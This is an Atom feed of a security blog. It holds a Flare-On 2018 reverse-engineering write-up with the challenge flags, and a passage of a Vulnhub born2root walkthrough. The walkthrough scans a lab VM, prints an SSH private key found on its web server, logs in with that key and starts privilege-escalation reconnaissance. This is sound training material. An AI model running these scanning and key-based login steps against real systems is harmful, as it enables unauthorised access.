<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom"><title>maggick's logs - Matthieu Keller</title><link href="https://matthieukeller.com/" rel="alternate"></link><link href="https://matthieukeller.com/feeds/matthieu-keller.atom.xml" rel="self"></link><id>https://matthieukeller.com/</id><updated>2018-10-07T11:43:00+02:00</updated><entry><title>Flare-on Challenge 2018</title><link href="https://matthieukeller.com/2018/10/flare-on-challenge-2018.html" rel="alternate"></link><published>2018-10-07T11:43:00+02:00</published><updated>2018-10-07T11:43:00+02:00</updated><author><name>Matthieu Keller</name></author><id>tag:matthieukeller.com,2018-10-07:/2018/10/flare-on-challenge-2018.html</id><summary type="html">&lt;p&gt;The fifth edition of the FireEye's Flare-on reverse challenge take place this year between
august 24th and the 5th octobe with a total of 12 challenges centered on Windows
binaries.
&lt;a href="https://www.fireeye.com/blog/threat-research/2018/08/announcing-the-fifth-annual-flare-on-challenge.html"&gt;https://www.fireeye.com/blog/threat-research/2018/08/announcing-the-fifth-annual-flare-on-challenge.html&lt;/a&gt;&lt;/p&gt;
</summary><content type="html">&lt;p&gt;The fifth edition of the FireEye's Flare-on reverse challenge take place this year between
august 24th and the 5th octobe with a total of 12 challenges centered on Windows
binaries.
&lt;a href="https://www.fireeye.com/blog/threat-research/2018/08/announcing-the-fifth-annual-flare-on-challenge.html"&gt;https://www.fireeye.com/blog/threat-research/2018/08/announcing-the-fifth-annual-flare-on-challenge.html&lt;/a&gt;&lt;/p&gt;


&lt;h2&gt;Minesweeper Championship Registration&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;Welcome to the Fifth Annual Flare-On Challenge! The Minesweeper World
Championship is coming soon and we found the registration app. You weren't
officially invited but if you can figure out what the code is you can probably
get in anyway. Good luck!&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;a href="/media/2018.10/flare/MinesweeperChampionshipRegistration.7z"&gt;Download the challenge&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;We download the 7z and after extraction we got the jar.
We start jd-gui and load the jar.
The &lt;code&gt;InviteValidator&lt;/code&gt; class is the following:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;javax.swing.JOptionPane&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;

&lt;span class="kd"&gt;public&lt;/span&gt; &lt;span class="kd"&gt;class&lt;/span&gt; &lt;span class="nc"&gt;InviteValidator&lt;/span&gt;
&lt;span class="o"&gt;{&lt;/span&gt;
  &lt;span class="kd"&gt;public&lt;/span&gt; &lt;span class="kd"&gt;static&lt;/span&gt; &lt;span class="kt"&gt;void&lt;/span&gt; &lt;span class="nf"&gt;main&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;String&lt;/span&gt;&lt;span class="o"&gt;[]&lt;/span&gt; &lt;span class="n"&gt;args&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;
  &lt;span class="o"&gt;{&lt;/span&gt;
    &lt;span class="n"&gt;String&lt;/span&gt; &lt;span class="n"&gt;response&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;JOptionPane&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;showInputDialog&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="kc"&gt;null&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;Enter your invitation code:&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;Minesweeper Championship 2018&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;3&lt;/span&gt;&lt;span class="o"&gt;);&lt;/span&gt;
    &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;response&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;equals&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;GoldenTicket2018@flare-on.com&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;))&lt;/span&gt; &lt;span class="o"&gt;{&lt;/span&gt;
      &lt;span class="n"&gt;JOptionPane&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;showMessageDialog&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="kc"&gt;null&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;Welcome to the Minesweeper Championship 2018!\nPlease enter the following code to the ctfd.flare-on.com website to compete:\n\n&amp;quot;&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;response&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;Success!&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="o"&gt;);&lt;/span&gt;
    &lt;span class="o"&gt;}&lt;/span&gt; &lt;span class="k"&gt;else&lt;/span&gt; &lt;span class="o"&gt;{&lt;/span&gt;
      &lt;span class="n"&gt;JOptionPane&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;showMessageDialog&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="kc"&gt;null&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;Incorrect invitation code. Please try again next year.&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;Failure&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="o"&gt;);&lt;/span&gt;
    &lt;span class="o"&gt;}&lt;/span&gt;
  &lt;span class="o"&gt;}&lt;/span&gt;
&lt;span class="o"&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;We directly got the challenge flag &lt;code&gt;GoldenTicket2018@flare-on.com&lt;/code&gt;.&lt;/p&gt;
&lt;h2&gt;Ultimate Minesweeper&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;You hacked your way into the Minesweeper Championship, good job. Now its time to
compete. Here is the Ultimate Minesweeper binary. Beat it, win the championship,
and we'll move you on to greater challenges.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;a href="/media/2018.10/flare/UltimateMinesweeper.7z"&gt;Download the challenge&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Once unzip the file is a 32bits executable binary.
    $ file UltimateMinesweeper.exe
    UltimateMinesweeper.exe: PE32 executable (GUI) Intel 80386 Mono/.Net assembly, for MS Windows&lt;/p&gt;
&lt;p&gt;When executed the program is similar to every Minesweeper execpt there is a LOT
of mines! Only 3 squares of the 900 are not mines. The goal is to reveal this 3
squares with exploding on a mine.&lt;/p&gt;
&lt;p&gt;&lt;img alt="Capture4.PNG" src="/media/2018.10/Capture4.PNG"&gt;&lt;/p&gt;
&lt;p&gt;We can use a tool like &lt;a href="https://github.com/0xd4d/dnSpy"&gt;DnSpy&lt;/a&gt; to decompile the
.NET and access the source code.&lt;/p&gt;
&lt;p&gt;&lt;img alt="Capture5.PNG" src="/media/2018.10/Capture5.PNG"&gt;&lt;/p&gt;
&lt;p&gt;We can even recompile the code. Nevertheless , the line 156 will fire a
compilation error. In order to fix it, we need to convert the value to byte:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;array3[(int)num2] = (byte)(array3[(int)num2] ^ array[(int)num]);
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;We can for instance disable the failure when revealing a mine by changing the
code of the &lt;code&gt;BombRevealed&lt;/code&gt; function and make it always return &lt;code&gt;false&lt;/code&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;public bool BombRevealed
{
  get
  {
    int num = 0;
    while ((long)num &amp;amp;lt; (long)((ulong)this.Size))
    {
      int num2 = 0;
      while ((long)num2 &amp;amp;lt; (long)((ulong)this.Size))
      {
        if (this.MinesPresent[num2, num] &amp;amp;amp;&amp;amp;amp; this.MinesVisible[num2, num])
        {
          return false;
        }
        num2++;
      }
      num++;
    }
    return false;
  }
}
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Then we can clic on every square and get the Success message.&lt;/p&gt;
&lt;p&gt;&lt;img alt="Capture2.PNG" src="/media/2018.10/Capture2.PNG"&gt;&lt;/p&gt;
&lt;p&gt;The flag seems to be encoded. When looking at the function &lt;code&gt;GetKey&lt;/code&gt; we see that
the &lt;code&gt;Random&lt;/code&gt; is build using a seed depending of the revealed cells.&lt;/p&gt;
&lt;p&gt;We then discover that the mines (and more importently the 3 empty squares) are
always at the same place. So we can just found the position of every empty
squares with our modify binary.&lt;/p&gt;
&lt;p&gt;&lt;img alt="Capture.PNG" src="/media/2018.10/Capture.PNG"&gt;&lt;/p&gt;
&lt;p&gt;And then just reveal this three squares in order to get the Success message with
the flag.&lt;/p&gt;
&lt;p&gt;&lt;img alt="Capture3.PNG" src="/media/2018.10/Capture3.PNG"&gt;&lt;/p&gt;
&lt;h2&gt;FLEGGO&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;When you are finished with your media interviews and talk show appearances after
that crushing victory at the Minesweeper Championship, I have another task for
you. Nothing too serious, as you'll see, this one is child's play.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;a href="/media/2018.10/flare/FLEGGO.7z"&gt;Download the challenge&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Once extraxted we get 48 executables. Each binary is a 32bits executable.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ file ./*
./1BpnGjHOT7h5vvZsV4vISSb60Xj3pX5G.exe: PE32 executable &lt;span class="o"&gt;(&lt;/span&gt;console&lt;span class="o"&gt;)&lt;/span&gt; Intel &lt;span class="m"&gt;80386&lt;/span&gt;, &lt;span class="k"&gt;for&lt;/span&gt; MS Window
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;When launching any of the executable we get an error about the VCRUNTIME140 DLL
missing.&lt;/p&gt;
&lt;p&gt;&lt;img alt="Capture6.PNG" src="/media/2018.10/Capture6.PNG"&gt;&lt;/p&gt;
&lt;p&gt;To fix this you just need to install Visual Studio Community Edition.&lt;/p&gt;
&lt;p&gt;After a few try using IDA and OllyDBG, I found a hint on &lt;a href="https://twitter.com/ixSly/status/1034842534957203456"&gt;twitter&lt;/a&gt;:
&lt;img alt="Capture7.PNG" src="/media/2018.10/Capture7.PNG"&gt;&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;FLOSS static UTF-16 strings
@BRICK
%s\%s
IronManSucks
Oh, hello Batman...
I super hate you right now.
What is the password?
%15ls
Go step on a brick!
Oh look a rainbow.
Everything is awesome!
%s =&amp;amp;gt; %s
BRICK
ZImIT7DyCMOeF6


FLOSS decoded 0 strings

FLOSS extracted 0 stackstrings

Finished execution after 2.266808 seconds
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;The binary password is given just after the &lt;code&gt;BRICK&lt;/code&gt; string.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@kalili:~/work/fleggo# wine 1BpnGjHOT7h5vvZsV4vISSb60Xj3pX5G.exe
000f:err:service:process_send_command receiving command result timed out
What is the password?
ZImIT7DyCMOeF6
Everything is awesome!
65141174.png =&amp;amp;gt; w
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;An image is created associated to a character.&lt;/p&gt;
&lt;p&gt;We can automatized this for the 48 binary:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@kalili:~/work/fleggo# for f in *exe; do wine $f &amp;amp;lt;&amp;amp;lt;&amp;amp;lt; `./floss $f | grep &amp;#39;^BRICK&amp;#39; -A 1 | grep -v BRICK` ; done
000f:err:service:process_send_command receiving command result timed out
What is the password?
Everything is awesome!
65141174.png =&amp;amp;gt; w
000f:err:service:process_send_command receiving command result timed out
What is the password?
Everything is awesome!
85934406.png =&amp;amp;gt; m
&amp;amp;lt;SNIP&amp;amp;gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;A simple redirection allow to keep the information in a file.
In the corner of each image is the position of the associated charactere.
(for instance the image 85934406.png is associated to the letter "m" and the
number in the right corner is 35 so the "m" is in the 35th position).&lt;/p&gt;
&lt;p&gt;&lt;img alt="Capture8.PNG" src="/media/2018.10/Capture8.PNG"&gt;&lt;/p&gt;
&lt;p&gt;We might use tesseract in order to automaticaly detect the number in the corner.
But I manualy identify them and got the order of the flag:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;mor3_awes0m3_th4n_an_awes0me_p0ssum@flare-on.com
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;binstall&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;It is time to get serious. Reverse Engineering isn't about toys and games.
Sometimes its about malicious software. I recommend you run this next
challenge in a VM or someone else's computer you have gained access to,
especially if they are a Firefox user.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;a href="/media/2018.10/flare/binstall.7z"&gt;Download the challenge&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Once unzip we get a simple executable.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ file binstall.exe
Downloads/binstall/binstall.exe: PE32 executable &lt;span class="o"&gt;(&lt;/span&gt;console&lt;span class="o"&gt;)&lt;/span&gt; Intel &lt;span class="m"&gt;80386&lt;/span&gt; Mono/.Net assembly, &lt;span class="k"&gt;for&lt;/span&gt; MS Windows
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;As said in the descritpion this file is a malware and a lot of AV detect it as
someone uploaded it on &lt;a href="https://www.virustotal.com/#/file/1284211e57621f84118ce28a4df024163f663c6891c9f154883df804b592ee08/detection"&gt;virus
total&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;&lt;img alt="Capture9.PNG" src="/media/2018.10/Capture9.PNG"&gt;&lt;/p&gt;
&lt;p&gt;I didn't get a lot of time to work on this challenge and didn't solve it.&lt;/p&gt;
&lt;h1&gt;Contest ending&lt;/h1&gt;
&lt;p&gt;The contest is now over and fireEye realse the &lt;a href="https://www.fireeye.com/blog/threat-research/2018/10/2018-flare-on-challenge-solutions.html"&gt;solution for all challenges&lt;/a&gt;.&lt;/p&gt;</content><category term="security"></category><category term="reverse"></category></entry><entry><title>Vulnhub, born2root</title><link href="https://matthieukeller.com/2017/11/vulnhub-born2root.html" rel="alternate"></link><published>2017-11-20T16:00:00+01:00</published><updated>2017-11-20T16:00:00+01:00</updated><author><name>Matthieu Keller</name></author><id>tag:matthieukeller.com,2017-11-20:/2017/11/vulnhub-born2root.html</id><summary type="html">&lt;p&gt;&lt;img class="align-left"
src="/media/2017.11/born2root/1.png" alt="Born2root homepage" width="162"&gt;&lt;/p&gt;
&lt;p&gt;After the bulldog machine I worked on the &lt;a href="https://www.vulnhub.com/entry/born2root-1,197/"&gt;born2root&lt;/a&gt; one.
A simple boot2root machine by &lt;a href="https://twitter.com/h4d3sw0rm"&gt;Hadi Mene&lt;/a&gt;.&lt;/p&gt;
</summary><content type="html">&lt;p&gt;&lt;img class="align-left"
src="/media/2017.11/born2root/1.png" alt="Born2root homepage" width="162"&gt;&lt;/p&gt;
&lt;p&gt;After the bulldog machine I worked on the &lt;a href="https://www.vulnhub.com/entry/born2root-1,197/"&gt;born2root&lt;/a&gt; one.
A simple boot2root machine by &lt;a href="https://twitter.com/h4d3sw0rm"&gt;Hadi Mene&lt;/a&gt;.&lt;/p&gt;


&lt;h2&gt;Discovery&lt;/h2&gt;
&lt;p&gt;First we scan all port of the VM:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@kalili:~# nmap -sSV 10.0.2.5

Starting Nmap 7.60 ( https://nmap.org ) at 2017-11-14 15:43 CET
Nmap scan report for 10.0.2.5
Host is up (0.00036s latency).
Not shown: 997 closed ports
PORT    STATE SERVICE VERSION
22/tcp  open  ssh     OpenSSH 6.7p1 Debian 5+deb8u3 (protocol 2.0)
80/tcp  open  http    Apache httpd 2.4.10 ((Debian))
111/tcp open  rpcbind 2-4 (RPC #100000)
MAC Address: 08:00:27:84:43:C4 (Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.74 seconds
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;So we got a SSH service on port 22 and a web service on the port 80.
Let's see what the website propose:&lt;/p&gt;
&lt;h2&gt;Web&lt;/h2&gt;
&lt;p&gt;The website simulate a company selling security services:&lt;/p&gt;
&lt;p&gt;&lt;img alt="Landing page" src="/media/2017.11/born2root/1.png"&gt;&lt;/p&gt;
&lt;p&gt;The robots.txt file contain 2 url:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;User-agent: *
Disallow: /wordpress-blog
Disallow: /files
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;The &lt;code&gt;/wordpress-blog&lt;/code&gt; lead us to a simple image:&lt;/p&gt;
&lt;p&gt;&lt;img alt="Troll" src="/media/2017.11/born2root/2.png"&gt;&lt;/p&gt;
&lt;p&gt;The /files give us an empty directory listing:&lt;/p&gt;
&lt;p&gt;&lt;img alt="Directory listing" src="/media/2017.11/born2root/4.png"&gt;&lt;/p&gt;
&lt;p&gt;We launch &lt;code&gt;dirb&lt;/code&gt; against the site:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@kalili:~# dirb http://10.0.2.5)
-----------------
DIRB v2.22
By The Dark Raver
-----------------

START_TIME: Tue Nov 14 15:45:36 2017
URL_BASE: http://10.0.2.5/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612

---- Scanning URL: http://10.0.2.5/ ----
==&amp;amp;gt; DIRECTORY: http://10.0.2.5/files/
==&amp;amp;gt; DIRECTORY: http://10.0.2.5/icons/
+ http://10.0.2.5/index.html (CODE:200|SIZE:5651)
==&amp;amp;gt; DIRECTORY: http://10.0.2.5/manual/
+ http://10.0.2.5/robots.txt (CODE:200|SIZE:57)
+ http://10.0.2.5/server-status (CODE:403|SIZE:296)

---- Entering directory: http://10.0.2.5/files/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it. (Use mode &amp;#39;-w&amp;#39; if you want to scan it anyway)
---- Entering directory: http://10.0.2.5/icons/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it. (Use mode &amp;#39;-w&amp;#39; if you want to scan it anyway)
---- Entering directory: http://10.0.2.5/manual/ ----
==&amp;amp;gt; DIRECTORY: http://10.0.2.5/manual/da/
&amp;amp;lt;SNIP&amp;amp;gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;It found an interesting directory: &lt;code&gt;icons&lt;/code&gt; it contains a lot of icon and a file VDSoyuAXiO.txt:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEAoNgGGOyEpn/txphuS2pDA1i2nvRxn6s8DO58QcSsY+/Nm6wC
tprVUPb+fmkKvOf5ntACY7c/5fM4y83+UWPG0l90WrjdaTCPaGAHjEpZYKt0lEc0
FiQkXTvJS4faYHNah/mEvhldgTc59jeX4di0f660mJjF31SA9UgMLQReKd5GKtUx
5m+sQq6L+VyA2/6GD/T3qx35AT4argdk1NZ9ONmj1ZcIp0evVJvUul34zuJZ5mDv
DZuLRR6QpcMLJRGEFZ4qwkMZn7NavEmfX1Yka6mu9iwxkY6iT45YA1C4p7NEi5yI
/P6kDxMfCVELAUaU8fcPolkZ6xLdS6yyThZHHwIDAQABAoIBAAZ+clCTTA/E3n7E
LL/SvH3oGQd16xh9O2FyR4YIQMWQKwb7/OgOfEpWjpPf/dT+sK9eypnoDiZkmYhw
+rGii6Z2wCXhjN7wXPnj1qotXkpu4bgS3+F8+BLjlQ79ny2Busf+pQNf1syexDJS
sEkoDLGTBiubD3Ii4UoF7KfsozihdmQY5qud2c4iE0ioayo2m9XIDreJEB20Q5Ta
lV0G03unv/v7OK3g8dAQHrBR9MXuYiorcwxLAe+Gm1h4XanMKDYM5/jW4JO2ITAn
kPducC9chbM4NqB3ryNCD4YEgx8zWGDt0wjgyfnsF4fiYEI6tqAwWoB0tdqJFXAy
FlQJfYECgYEAz1bFCpGBCApF1k/oaQAyy5tir5NQpttCc0L2U1kiJWNmJSHk/tTX
4+ly0CBUzDkkedY1tVYK7TuH7/tOjh8M1BLa+g+Csb/OWLuMKmpoqyaejmoKkLnB
WVGkcdIulfsW7DWVMS/zA8ixJpt7bvY7Y142gkurxqjLMz5s/xT9geECgYEAxpfC
fGvogWRYUY07OLE/b7oMVOdBQsmlnaKVybuKf3RjeCYhbiRSzKz05NM/1Cqf359l
Wdznq4fkIvr6khliuj8GuCwv6wKn9+nViS18s1bG6Z5UJYSRJRpviCS+9BGShG1s
KOf1fAWNwRcn1UKtdQVvaLBX9kIwcmTBrl+e6P8CgYAtz24Zt6xaqmpjv6QKDxEq
C1rykAnx0+AKt3DVWYxB1oRrD+IYq85HfPzxHzOdK8LzaHDVb/1aDR0r2MqyfAnJ
kaDwPx0RSN++mzGM7ZXSuuWtcaCD+YbOxUsgGuBQIvodlnkwNPfsjhsV/KR5D85v
VhGVGEML0Z+T4ucSNQEOAQKBgQCHedfvUR3Xx0CIwbP4xNHlwiHPecMHcNBObS+J
4ypkMF37BOghXx4tCoA16fbNIhbWUsKtPwm79oQnaNeu+ypiq8RFt78orzMu6JIH
dsRvA2/Gx3/X6Eur6BDV61to3OP6+zqh3TuWU6OUadt+nHIANqj93e7jy9uI7jtC
XXDmuQKBgHZAE6GTq47k4sbFbWqldS79yhjjLloj0VUhValZyAP6XV8JTiAg9CYR
2o1pyGm7j7wfhIZNBP/wwJSC2/NLV6rQeH7Zj8nFv69RcRX56LrQZjFAWWsa/C43
rlJ7dOFH7OFQbGp51ub88M1VOiXR6/fU8OMOkXfi1KkETj/xp6t+
-----END RSA PRIVATE KEY-----
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;This looks like an ssh private key. We extract the associated public key:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;openssl rsa -in .ssh/id_rsa -pubout -out key.pub
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;And we convert it to  ssh format:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;ssh-keygen -f key.pub -i -mPKCS8
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;The we can copy the private key to &lt;code&gt;~/.ssh/id_rsa&lt;/code&gt; and the public key to &lt;code&gt;~/.ssh/id_rsa.pub&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;But we have no idea of the associated user. We try the one listed on the site main page:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Martin N =&amp;gt; martin, martinn, nmartin&lt;/li&gt;
&lt;li&gt;Hadi M =&amp;gt; hadi, hadim, mhadi&lt;/li&gt;
&lt;li&gt;Jimmy S =&amp;gt; jimmy, jymmys, sjimmy&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;And we got a shell with the first one: martin. The server is asking us for a password, but we already got a shell. Entering anything will give use the focus and &lt;code&gt;CTRL-C&lt;/code&gt; it will give us a simple error message.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@kalili:~# ssh 10.0.2.5 -i .ssh/id_rsa -lmartin

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Tue Nov 14 15:57:00 2017 from 10.0.2.15

READY TO ACCESS THE SECRET LAB ?

secret password : ^CTraceback (most recent call last):
  File &amp;quot;/var/tmp/login.py&amp;quot;, line 8, in &amp;amp;lt;module&amp;amp;gt;
    password = raw_input(&amp;quot;secret password : &amp;quot;)
KeyboardInterrupt
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;The program doesn't seems to work as intended:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="n"&gt;martin&lt;/span&gt;&lt;span class="nd"&gt;@debian&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="o"&gt;~&lt;/span&gt;&lt;span class="err"&gt;$&lt;/span&gt; &lt;span class="n"&gt;cat&lt;/span&gt; &lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;var&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;tmp&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;login&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;py&lt;/span&gt;
&lt;span class="c1"&gt;#!/usr/bin/python&lt;/span&gt;

&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;os&lt;/span&gt;

&lt;span class="k"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="k"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;READY TO ACCESS THE SECRET LAB ? &amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="k"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="n"&gt;password&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;raw_input&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;secret password : &amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;

&lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;password&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;secretsec&amp;quot;&lt;/span&gt; &lt;span class="ow"&gt;or&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;secretlab&amp;quot;&lt;/span&gt; &lt;span class="p"&gt;:&lt;/span&gt;
  &lt;span class="k"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;WELCOME ! &amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="k"&gt;else&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
  &lt;span class="k"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;GET OUT ! &amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
  &lt;span class="n"&gt;os&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;system&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;pkill -u &amp;#39;martin&amp;#39;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;Privilege elevation&lt;/h2&gt;
&lt;p&gt;As always a bit of reconnaissance is needed.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;martin@debian:~$ ls -alRh /home/
/home/:
&amp;amp;lt;SNIP&amp;amp;gt;

/home/hadi:
total 60K
drwxr-xr-x 3 hadi hadi 4,0K juin   5 13:40 .
drwxr-xr-x 5 root root 4,0K juin   9 20:17 ..
-rw-r--r-- 1 hadi hadi  220 avril 26  2017 .bash_logout
-rw-r--r-- 1 hadi hadi 3,5K avril 26  2017 .bashrc
-rwxr-xr-x 1 root root 5,3K mai   10  2017 buff
-rw-r--r-- 1 root root 1,1K mai   10  2017 buff.c
-rw-r--r-- 1 root root  148 juin   5 13:25 example.c
-rw------- 1 root root 2,1K juin   5 13:40 .gdb_history
-rwxr-xr-x 1 root root 5,9K juin   5 13:38 overflow
-rw-r--r-- 1 root root   19 mai   10  2017 peda-session-buff.txt
